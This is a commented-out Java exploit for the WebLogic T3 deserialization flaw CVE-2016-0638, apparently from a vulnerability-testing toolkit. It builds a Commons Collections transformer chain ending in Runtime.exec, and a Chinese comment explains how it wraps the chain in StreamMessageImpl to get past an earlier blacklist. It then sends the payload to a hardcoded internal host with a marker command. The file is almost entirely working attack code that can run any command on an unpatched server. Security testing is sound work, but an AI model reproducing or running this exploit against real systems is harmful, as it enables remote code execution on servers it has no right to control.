//import org.apache.commons.collections.Transformer;
//import org.apache.commons.collections.functors.ChainedTransformer;
//import org.apache.commons.collections.functors.ConstantTransformer;
//import org.apache.commons.collections.functors.InvokerTransformer;
//import org.apache.commons.collections.map.LazyMap;
//import weblogic.corba.utils.MarshalledObject;
//import weblogic.jms.common.StreamMessageImpl;
//
//import java.io.ByteArrayOutputStream;
//import java.io.ObjectOutputStream;
//import java.lang.reflect.InvocationHandler;
//import java.lang.reflect.Proxy;
//import java.util.HashMap;
//import java.util.Map;
//
//import static util.t3tool.WeblogicT3.*;
//
//public class T3_CVE_2016_0638 {
//
//    public static byte[] getPayload(String cmd) throws Exception {
//
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
//                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
//                new InvokerTransformer("exec",new Class[]{String.class}, new Object[]{cmd})
//        };
//
//        final Transformer transformerChain = new ChainedTransformer(transformers);
//        final Map innerMap = new HashMap();
//
//        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
//
//        InvocationHandler handler = (InvocationHandler) getFirstCtor(
//                "sun.reflect.annotation.AnnotationInvocationHandler")
//                .newInstance(Override.class, lazyMap);
//
//        final Map mapProxy = Map.class
//                .cast(Proxy.newProxyInstance(Map.class.getClassLoader(),
//                        new Class[]{Map.class}, handler));
//
//        handler = (InvocationHandler) getFirstCtor(
//                "sun.reflect.annotation.AnnotationInvocationHandler")
//                .newInstance(Override.class, mapProxy);
//
//        /*
//        2 \CVE-2016-0638   对CVE-2015-4852黑名单的绕过，利用StreamMessageImpl 不在黑名单中，且其自身
//        继承Externalizable类，重写了readExternal方法，反序列化的时候就会调用自己readExternal方法，在该方法
//        中，满足条件时，其调用了readObject方法来反序列化其自己的某个变量，我们可以将那个变量设置成恶意的反序列化
//        对象，从而触发漏洞
//        序列化数据StreamMessageImpl绕过
//         */
//        StreamMessageImpl obj = new StreamMessageImpl();
//        byte[] o = serialize(handler);
//        obj.setDataBuffer(o,o.length);
//        ByteArrayOutputStream out = new ByteArrayOutputStream();
//        ObjectOutputStream objOut = new ObjectOutputStream(out);
//        objOut.writeObject(obj);
//
//        objOut.flush();
//        objOut.close();
//        byte[] payload = out.toByteArray();
//
//        return  payload;
//    }
//
//    public static void main(String[] args) throws Exception {
//
//
//        String host = "10.58.120.200";
//        String port = "7001";
//        String cmd = "touch /tmp/T3_CVE_2016_0638";
//
//        byte[] payload = getPayload(cmd);
//        t3Send(host, port, payload);
//    }
//}
